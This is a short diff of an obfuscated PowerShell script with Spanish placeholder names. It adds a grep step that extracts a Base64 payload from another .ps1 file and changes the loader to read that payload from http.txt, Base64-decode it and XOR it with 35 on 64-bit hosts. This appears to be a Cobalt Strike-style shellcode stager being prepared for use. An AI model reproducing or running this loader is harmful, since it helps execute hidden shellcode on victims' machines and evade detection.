@@ -1,3 +1,8 @@
+generate a .ps1
+extract the data
+cat b4.ps1 | grep -oP "(?<=FromBase64String\(').*?(?='\))" >> http.txt
+
+
 Set-StrictMode -Version 2
 
 function func_chorizo_fantasma {
@@ -22,7 +27,7 @@ function func_donuts_invisibles {
 
 If ([IntPtr]::size -eq 8) {
 	# Leer contenido del archivo 'aqui.ps1'
-	[Byte[]]$tigre_dorado = [System.Convert]::FromBase64String((Get-Content -Path "aqui.ps1"))
+	[Byte[]]$tigre_dorado = [System.Convert]::FromBase64String((Get-Content -Path "http.txt"))
 
 	for ($albondiga = 0; $albondiga -lt $tigre_dorado.Count; $albondiga++) {
 		$tigre_dorado[$albondiga] = $tigre_dorado[$albondiga] -bxor 35
